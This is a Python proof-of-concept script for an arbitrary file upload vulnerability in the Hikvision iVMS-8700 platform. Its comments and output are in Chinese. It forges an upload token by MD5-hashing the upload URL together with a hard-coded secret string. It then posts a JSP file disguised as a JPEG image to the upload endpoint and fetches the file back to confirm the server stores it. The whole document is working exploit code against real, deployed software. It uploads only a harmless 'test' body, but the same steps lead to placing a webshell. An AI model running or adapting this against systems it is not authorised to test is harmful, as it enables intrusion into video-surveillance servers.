'''
Function:
    ivms-8700-任意文件上传
Author:
    spmonkey
Email：
    spmonkey@hscsec.cn
Blog:
    https://spmonkey.github.io/
GitHub:
    https://github.com/spmonkey/
'''
# -*- coding: utf-8 -*-
import requests
import hashlib
from urllib.parse import urlparse
from requests.packages.urllib3 import disable_warnings
disable_warnings()


class poc:
    def __init__(self, url):
        self.headers = {
            'User-Agent': 'Mozilla/4.0 (Mozilla/4.0; MSIE 7.0; Windows NT 5.1; FDM; SV1; .NET CLR 3.0.04506.30)',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8',
            'Connection': 'close',
            'Origin': 'null',
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': 'max-age=0'
        }
        self.url = url

    def host(self):
        url = urlparse(self.url)
        return url.netloc

    def token(self, url):
        url = "http://{}/eps/api/resourceOperations/uploadsecretKeyIbuilding".format(url)
        md5 = hashlib.md5(url.encode()).hexdigest()
        return md5.upper()

    def vuln(self, urls, token):
        try:
            url = "http://{}/eps/api/resourceOperations/upload?token={}".format(urls, token)
            data = {
                'fileUploader': ('spmonkey.jsp', b'test', 'image/jpeg')
            }
            result = requests.post(url=url, headers=self.headers, files=data, verify=False)
            if result.json()["message"] == "上传附件成功":
                path = "http://{}/eps/upload/{}.jsp".format(urls, result.json()["data"]["resourceUuid"])
                result = requests.get(path, verify=False)
                if "test" in result.text:
                    print("[+] {}存在任意文件上传漏洞".format("http://{}/".format(urls)))
                else:
                    print("[-] 不存在任意文件上传漏洞")
            else:
                print("[-] 不存在任意文件上传漏洞")
        except:
            url = "https://{}/eps/api/resourceOperations/upload?token={}".format(urls, token)
            data = {
                'fileUploader': ('spmonkey.jsp', b'test', 'image/jpeg')
            }
            result = requests.post(url=url, headers=self.headers, files=data, verify=False)
            if result.json()["message"] == "上传附件成功":
                path = "https://{}/eps/upload/{}.jsp".format(urls, result.json()["data"]["resourceUuid"])
                result = requests.get(path, verify=False)
                if "test" in result.text:
                    print("[+] {}存在任意文件上传漏洞".format("https://{}/".format(urls)))
                else:
                    print("[-] 不存在任意文件上传漏洞")
            else:
                print("[-] 不存在任意文件上传漏洞")

    def main(self):
        netloc = self.host()
        token = self.token(netloc)
        print("[*] 正在验证，请稍后...")
        print()
        self.vuln(urls=netloc, token=token)
        print()


if __name__ == '__main__':
    url = input("请输入url：")
    print()
    poc(url).main()
